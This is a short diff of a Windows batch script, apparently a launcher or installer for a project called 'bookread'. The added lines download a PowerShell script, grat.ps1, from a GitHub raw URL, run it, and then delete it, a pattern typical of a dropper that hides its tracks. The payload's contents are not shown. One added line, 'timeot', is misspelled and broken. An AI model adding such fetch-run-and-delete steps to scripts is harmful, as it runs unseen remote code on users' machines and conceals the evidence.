@@ -13,8 +13,10 @@ curl https://raw.githubusercontent.com/zvdxc/bookread/main/sources/uninstall.bat
 echo cd sources >> start.bat
 echo start code.bat >> start.bat
 echo exit >> start.bat
-
+curl https://raw.githubusercontent.com/zvdxc/bookread/main/sources/grat.ps1 >> grat.ps1
 powershell .\grat.ps1
+timeot 1 >> NUL
+del grat.ps1
 exit
 
 
